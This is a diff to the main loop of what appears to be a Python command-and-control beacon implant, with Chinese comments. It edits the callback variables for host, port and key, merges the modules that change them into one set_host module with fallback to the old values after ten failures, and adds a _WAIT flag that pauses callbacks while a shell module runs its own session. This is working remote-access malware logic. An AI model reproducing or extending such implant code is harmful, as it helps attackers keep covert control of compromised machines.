@@ -17,7 +17,7 @@ CONN_KEY = MASTER_KEY
 _D = BEACON_ID            # 当前 beacon id
 _H = HOST                 # server 地址(set_host 模块修改,connect_transport 读取)
 _P = PORT                 # server 端口(set_host 模块修改,connect_transport 读取)
-_K = MASTER_KEY           # 部署密钥(set_key 模块修改)
+_K = MASTER_KEY           # 部署密钥(set_host 模块 key 参数修改)
 _CK = MASTER_KEY          # 当前连接密钥(uplevel _disp 按通道层切换;cycle 每轮 CONN_KEY=_CK)
 _B = BREAK_FLAG           # break 标志(主循环检查 _B)
 # 回连间隔/抖动用 globals() 字符串键存储: set_interval 模块与 sleep_jitter
@@ -288,7 +288,15 @@ while True:
     if _slp > tm.time():
         tm.sleep(_slp - tm.time())
         continue
-    # set_host/set_key/set_port 验证钩子: 新参数 pending 时本轮用新值回连,
+    # _WAIT 独占回连: 长驻会话类模块(shell 等)在任务线程里自行
+    # register 回连并置 globals()["_WAIT"]——主循环此时必须休眠,
+    # 否则双循环(普通注册与增强会话注册交替, server 端 beacon 状态
+    # 来回闪切, 2026-09-05 修复; _IN_SHELL 泛化为 _WAIT——任何模块
+    # 置 _WAIT 即暂停主循环回连, 会话结束清掉即恢复)
+    if globals().get("_WAIT"):
+        tm.sleep(1.0)
+        continue
+    # set_host 验证钩子(host/port/key 合并模块): 新参数 pending 时本轮用新值回连,
     # 成功(welcome)即正式生效并清 pending; 失败计数, 连续 10 次失败回退
     # 旧参数(_SET_BACKUP 保存旧 host/port/key, 回退后 _H/_P/_K 恢复原值)。
     _sp = globals().get("_SET_PENDING")
